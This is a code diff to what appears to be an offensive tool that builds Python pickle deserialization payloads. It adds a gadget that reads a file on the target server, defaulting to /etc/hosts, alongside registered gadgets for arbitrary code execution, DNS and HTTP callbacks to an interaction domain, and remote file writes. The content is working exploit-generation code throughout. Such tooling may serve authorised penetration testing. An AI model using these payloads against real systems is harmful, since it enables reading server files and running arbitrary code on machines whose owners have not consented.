@@ -50,6 +50,15 @@ class PickleFileWrite(PickleCode):
 f = open("{file}", "w")
 f.write("{content}")
 f.close()""")
+        
+class PickleFileRead(PickleCode):
+
+    def __init__(self, args):
+        file = args[0]
+        super().__init__(f"""
+f = open("{file}", "r")
+print(f.read())
+f.close()""")
     
 class Pickle(Serializer):
 
@@ -62,11 +71,12 @@ class Pickle(Serializer):
         self.addGadget('PickleCode', '<code>')
         self.addGadget('PickleDNS', '<domain>')
         self.addGadget('PickleHttpGet', '<url>')
-        self.addGadget('PickleFileWrite', '<remote_file>;<content>')
+        self.addGadget('PickleFileWrite', '<remote_file_to_write>;<content>')
+        self.addGadget('PickleFileRead', '<remote_file_to_read>')
 
     def addGadget(self, name, format):
         self.gadgets.append({
-            'id': name,
+            'id': name.lower(),
             'name': name,
             'description': f'{name}: {format}',
             'format': format
@@ -105,11 +115,13 @@ class Pickle(Serializer):
         interact_domain = self.chainOpts.interact_domain
         py_code = self.getFileContentOrCode(self.chainOpts.python_code)
         remote_file_to_write = self.chainOpts.remote_file_to_write
+        remote_file_to_read = "/etc/hosts" if self.chainOpts.remote_file_to_read is None else self.chainOpts.remote_file_to_read
         remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else py_code
     
         logging.info(f"Interact domain: {interact_domain}")
         logging.info(f"System command: {system_command}")
         logging.info(f"Python Code: {self.chainOpts.python_code}")
+        logging.info(f"File read on server: {remote_file_to_read}")
         logging.info(f"File written on remote server: {remote_file_to_write}")
         logging.info(f"Content written on server: {remote_content}")
 
@@ -147,7 +159,8 @@ class Pickle(Serializer):
             chainArguments = chainArguments.replace('<code>', chain_py_code)
             chainArguments = chainArguments.replace('<domain>', str(interact_domain))
             chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/?{chain['id']}")
-            chainArguments = chainArguments.replace('<remote_file>', remote_file_to_write.replace('%%ext%%', 'py'))
+            chainArguments = chainArguments.replace('<remote_file_to_read>', remote_file_to_read)
+            chainArguments = chainArguments.replace('<remote_file_to_write>', remote_file_to_write.replace('%%ext%%', 'py'))
             chainArguments = chainArguments.replace('<content>', chain_remote_content)
             
 
